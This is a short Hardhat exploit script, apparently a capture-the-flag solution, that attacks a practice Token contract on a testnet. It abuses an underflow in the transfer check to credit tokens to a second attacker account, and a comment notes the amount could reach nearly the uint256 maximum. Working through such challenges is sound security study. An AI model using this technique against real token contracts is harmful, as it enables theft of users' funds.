const { ethers, network, getNamedAccounts, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");
const {
  abi: TokenABI,
} = require("../artifacts/contracts/05-token/Token.sol/Token.json");

async function attackToken() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;

    const [attacker1, attacker2] = await ethers.getSigners();
    const attacker1Addr = await attacker1.getAddress();
    const attacker2Addr = await attacker2.getAddress();

    const aToken = networkConfig[chainId]["token"];
    const cToken = new ethers.Contract(aToken, TokenABI, attacker1);

    const balanceBefore = await cToken.balanceOf(attacker2Addr);
    console.log("Token balance before attack: ", balanceBefore.toString());

    console.log("Attacking...");
    const tx1 = await cToken.transfer(attacker2Addr, "30");
    // stealing 10 tokens but could also steal the uin256 max: ethers.BigNumber.from("2").pow("256").sub("21")
    await tx1.wait();

    const balanceAfter = await cToken.balanceOf(attacker2Addr);
    console.log("Token balance after attack: ", balanceAfter.toString());
  }
}

attackToken()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
